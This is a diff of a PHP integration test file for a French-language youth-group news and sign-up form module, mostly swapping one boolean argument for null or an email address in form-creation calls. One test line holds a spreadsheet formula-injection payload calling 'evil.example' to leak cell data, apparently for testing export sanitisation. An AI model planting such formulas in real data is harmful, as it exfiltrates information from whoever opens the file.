@@ -272,7 +272,7 @@ class NewsIntegrationTest extends TestCase
     {
         AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
         $articleId = $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId);
-        $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
 
         $body = $this->newsController->edit(
             new Request('GET', '/news/' . $articleId . '/gerer', [], [], [], []),
@@ -320,7 +320,7 @@ class NewsIntegrationTest extends TestCase
     {
         AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
         $articleId = $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId);
-        $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
 
         // Two views of ONE route, told apart by a query string the picker
         // never sees — so the call site computes a synthetic current_path.
@@ -349,7 +349,7 @@ class NewsIntegrationTest extends TestCase
     {
         AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
         $articleId = $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId);
-        $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, 3);
+        $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, 3);
 
         // $this->newsController is built with no FinanceAccountInterface.
         $body = $this->newsController->edit(
@@ -364,7 +364,7 @@ class NewsIntegrationTest extends TestCase
     {
         [$controller] = $this->controllerWithFinanceAccounts();
         $articleId = $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, 42);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, 42);
 
         $body = $controller->edit(
             new Request('GET', '/news/' . $articleId . '/gerer', [], [], [], []),
@@ -384,7 +384,7 @@ class NewsIntegrationTest extends TestCase
     {
         [$controller] = $this->controllerWithFinanceAccounts();
         $articleId = $this->articleRepository->create('Réunion', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId);
-        $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
 
         $body = $controller->edit(
             new Request('GET', '/news/' . $articleId . '/gerer', [], [], [], []),
@@ -411,7 +411,7 @@ class NewsIntegrationTest extends TestCase
         AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
         $articleId = $this->articleRepository->create('Article avec formulaire', Article::VISIBILITY_PUBLIC, true, 'mots,cles', '2027-01-01', $this->chiefAccountId);
         $this->articleRepository->setShortUrlCode($articleId, 'abc123');
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_IDENTIFIED, NewsForm::RESPONSE_LIMIT_ONE_PER_ACCOUNT, '2026-01-01', '2026-12-31', false, 'chief', true, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_IDENTIFIED, NewsForm::RESPONSE_LIMIT_ONE_PER_ACCOUNT, '2026-01-01', '2026-12-31', false, 'chief', 'resume@unite.test', null);
         $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
         $this->fieldRepository->create($formId, 1, FormField::TYPE_NUMBER, 'Places', false, null, null, 20, null, null);
         $this->fieldRepository->create($formId, 2, FormField::TYPE_DROPDOWN, 'Jour', false, 'manual', "Lundi\nMardi", null, null, null);
@@ -468,7 +468,7 @@ class NewsIntegrationTest extends TestCase
     {
         AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
         $articleId = $this->articleRepository->create('Article preview', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_IDENTIFIED, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_IDENTIFIED, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
         $this->fieldRepository->create($formId, 0, FormField::TYPE_NUMBER, 'Repas', false, null, null, 10, null, null);
 
         $response = $this->newsController->edit(new Request('GET', '/news/' . $articleId . '/gerer', ['tab' => 'preview'], [], [], []), ['id' => (string) $articleId]);
@@ -635,7 +635,7 @@ class NewsIntegrationTest extends TestCase
         $id = $this->articleRepository->create('Membres', Article::VISIBILITY_IDENTIFIED, false, null, null, $this->chiefAccountId);
         $this->articleRepository->update($id, 'Membres', Article::VISIBILITY_IDENTIFIED, false, null, null, 'Un resume public.', 55);
         $this->editableContentService->set(ArticleService::bodyContentKey($id), '<p>Le corps secret du camp.</p>', 'rich_text', $this->chiefAccountId);
-        $this->formRepository->create($id, NewsForm::ACCESS_IDENTIFIED, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $this->formRepository->create($id, NewsForm::ACCESS_IDENTIFIED, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
 
         $response = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id]);
         $body = $response->getBody();
@@ -769,7 +769,7 @@ class NewsIntegrationTest extends TestCase
     public function testShowRendersOpenFormAndAcceptsASubmission(): void
     {
         $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
         $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
 
         $showResponse = $this->newsController->show(new Request('GET', '/news/' . $articleId, [], [], [], []), ['id' => (string) $articleId]);
@@ -819,7 +819,7 @@ class NewsIntegrationTest extends TestCase
     public function testCappedNumberFieldRendersARealMaxAttribute(): void
     {
         $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
         $this->fieldRepository->create($formId, 0, FormField::TYPE_NUMBER, 'Places', true, null, null, 2, null, null);
 
         $body = $this->newsController->show(
@@ -843,7 +843,7 @@ class NewsIntegrationTest extends TestCase
     public function testFullRequiredNumberFieldRendersAsCompletAndTheFormStillSubmits(): void
     {
         $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
         $placesId = $this->fieldRepository->create($formId, 0, FormField::TYPE_NUMBER, 'Places bus', true, null, null, 2, null, null);
         $nameId = $this->fieldRepository->create($formId, 1, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
         $this->responseRepository->create($formId, null, null, 'x@test.com', [$placesId => '2'], null, null);
@@ -879,7 +879,7 @@ class NewsIntegrationTest extends TestCase
     public function testSubmitErrorRedisplayKeepsThePostedValues(): void
     {
         $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
         $nameId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
         $daysId = $this->fieldRepository->create($formId, 1, FormField::TYPE_CHECKBOX, 'Jours', false, FormField::OPTIONS_SOURCE_MANUAL, "Lundi\nMardi", null, null, null);
         $emailId = $this->fieldRepository->create($formId, 2, FormField::TYPE_EMAIL, 'Email parent', true, null, null, null, null, null);
@@ -908,7 +908,7 @@ class NewsIntegrationTest extends TestCase
     public function testSubmitRejectsClosedFormAndRedisplaysArticle(): void
     {
         $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, true, 'chief', false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, true, 'chief', null, null);
         // A form with zero real input fields has nothing to submit, so the
         // "closed" messaging only renders once there's at least one.
         $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
@@ -936,7 +936,7 @@ class NewsIntegrationTest extends TestCase
         $this->twig->addGlobal('menus', [['id' => 'notre_unite', 'label' => 'Notre unité']]);
 
         $articleId = $this->articleRepository->create('Sortie Ardennes', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, true, 'chief', false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, true, 'chief', null, null);
         $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
 
         $request = new Request('POST', '/news/' . $articleId . '/form/submit', [], [
@@ -957,7 +957,7 @@ class NewsIntegrationTest extends TestCase
     {
         AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
         $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
         $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
         $this->responseRepository->create($formId, null, null, 'parent@test.com', [$fieldId => 'Alice'], null, null);
 
@@ -971,7 +971,7 @@ class NewsIntegrationTest extends TestCase
     {
         AuthSession::login($this->chiefAccountId, 'chief@test.com', 'identified');
         $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
-        $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
 
         $response = $this->formController->responses(new Request('GET', '/news/' . $articleId . '/form/responses', [], [], [], []), ['id' => (string) $articleId]);
 
@@ -1098,7 +1098,7 @@ class NewsIntegrationTest extends TestCase
     private function articleWithOneResponse(string $responseRoleMin = 'chief'): int
     {
         $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, $responseRoleMin, false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, $responseRoleMin, null, null);
         $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
         $this->responseRepository->create($formId, null, null, 'parent@test.com', [$fieldId => 'Alice'], null, null);
 
@@ -1118,7 +1118,7 @@ class NewsIntegrationTest extends TestCase
         $articleId = $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId);
         $formId = $this->formRepository->create(
             $articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED,
-            null, null, false, 'chief', false, 7, true, '2026-03-14', 'Salle'
+            null, null, false, 'chief', null, 7, true, '2026-03-14', 'Salle'
         );
         $nameField = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
         $seatField = $this->fieldRepository->create($formId, 1, FormField::TYPE_NUMBER, 'Repas adulte', false, null, null, 100, 15.0, null);
@@ -1720,7 +1720,7 @@ class NewsIntegrationTest extends TestCase
     {
         AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
         $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
         $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
         $this->responseRepository->create($formId, null, null, 'parent@test.com', [$fieldId => 'Alice'], null, null);
 
@@ -1741,7 +1741,7 @@ class NewsIntegrationTest extends TestCase
     {
         AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
         $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
         $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
 
         $payload = '=HYPERLINK("https://evil.example/?d="&A2,"Cliquez")';
@@ -1770,7 +1770,7 @@ class NewsIntegrationTest extends TestCase
     public function testEditResponsePageRendersForOwnerWhileOpen(): void
     {
         $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_IDENTIFIED, NewsForm::RESPONSE_LIMIT_ONE_PER_ACCOUNT, null, null, false, 'chief', false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_IDENTIFIED, NewsForm::RESPONSE_LIMIT_ONE_PER_ACCOUNT, null, null, false, 'chief', null, null);
         $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
         $responseId = $this->responseRepository->create($formId, 55, null, 'me@test.com', [$fieldId => 'Bob'], null, null);
 
@@ -1788,7 +1788,7 @@ class NewsIntegrationTest extends TestCase
     public function testEditResponsePageRejectsADifferentAccount(): void
     {
         $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_IDENTIFIED, NewsForm::RESPONSE_LIMIT_ONE_PER_ACCOUNT, null, null, false, 'chief', false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_IDENTIFIED, NewsForm::RESPONSE_LIMIT_ONE_PER_ACCOUNT, null, null, false, 'chief', null, null);
         $responseId = $this->responseRepository->create($formId, 55, null, 'me@test.com', [], null, null);
 
         AuthSession::login(56, 'other@test.com', 'identified');
@@ -1949,7 +1949,7 @@ class NewsIntegrationTest extends TestCase
     {
         AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
         $articleId = $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
         $first = $this->responseRepository->create($formId, null, null, 'a@test.com', [], null, null);
         $second = $this->responseRepository->create($formId, null, null, 'b@test.com', [], null, null);
 
@@ -1980,7 +1980,7 @@ class NewsIntegrationTest extends TestCase
     {
         AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
         $articleId = $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null, true);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null, true);
         $responseId = $this->responseRepository->create($formId, null, null, 'a@test.com', [], null, null);
         (new \Modules\News\Service\TicketService($this->responseRepository))->issueFor($this->responseRepository->findById($responseId));
         $before = $this->responseRepository->findById($responseId)?->ticketReference;
@@ -2000,7 +2000,7 @@ class NewsIntegrationTest extends TestCase
     {
         AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
         $articleId = $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null, true);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null, true);
         $responseId = $this->responseRepository->create($formId, null, null, 'a@test.com', [], null, null);
         (new \Modules\News\Service\TicketService($this->responseRepository))->issueFor($this->responseRepository->findById($responseId));
         $reference = $this->responseRepository->findById($responseId)?->ticketReference;
@@ -2021,7 +2021,7 @@ class NewsIntegrationTest extends TestCase
     {
         AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
         $articleId = $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
 
         $token = CsrfGuard::generateToken();
         $_FILES['image'] = $this->fakeUploadedImage();
@@ -2043,7 +2043,7 @@ class NewsIntegrationTest extends TestCase
     {
         AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
         $articleId = $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, true, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null, true, '2026-03-14', 'Salle');
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null, true, '2026-03-14', 'Salle');
 
         $quiet = $this->newsController->edit(
             new Request('GET', '/news/' . $articleId . '/gerer', [], [], [], []),
@@ -2359,7 +2359,7 @@ class NewsIntegrationTest extends TestCase
     public function testUpdateResponseJournalsTheResponseUpdate(): void
     {
         $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
         $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
         $responseId = $this->responseRepository->create($formId, null, null, 'parent@test.com', [$fieldId => 'Alice'], null, null);
 
@@ -2385,7 +2385,7 @@ class NewsIntegrationTest extends TestCase
     public function testSubmitJournalsTheResponseSubmission(): void
     {
         $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
         $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
 
         $this->journalService->expects($this->once())->method('log')
@@ -2415,7 +2415,7 @@ class NewsIntegrationTest extends TestCase
     public function testTheSameAnswerSentTwiceIsOneResponse(): void
     {
         $articleId = $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
         $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
 
         $body = [
@@ -2442,7 +2442,7 @@ class NewsIntegrationTest extends TestCase
     public function testADifferentAnswerFromTheSameAddressIsStillANewResponse(): void
     {
         $articleId = $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
         $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
 
         foreach (['Alice', 'Basile'] as $name) {
@@ -2467,7 +2467,7 @@ class NewsIntegrationTest extends TestCase
     {
         AuthSession::login($this->chiefAccountId, 'chief@test.com', 'admin');
         $articleId = $this->articleRepository->create('Souper', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
         $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
         for ($i = 0; $i < 55; $i++) {
             $this->responseRepository->create($formId, null, null, 'p' . $i . '@test.com', [$fieldId => 'Nom ' . $i], null, null);
@@ -2499,7 +2499,7 @@ class NewsIntegrationTest extends TestCase
     {
         AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
         $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
-        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
         $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
         $this->responseRepository->create($formId, null, null, 'parent@test.com', [$fieldId => 'Alice'], null, null);
 
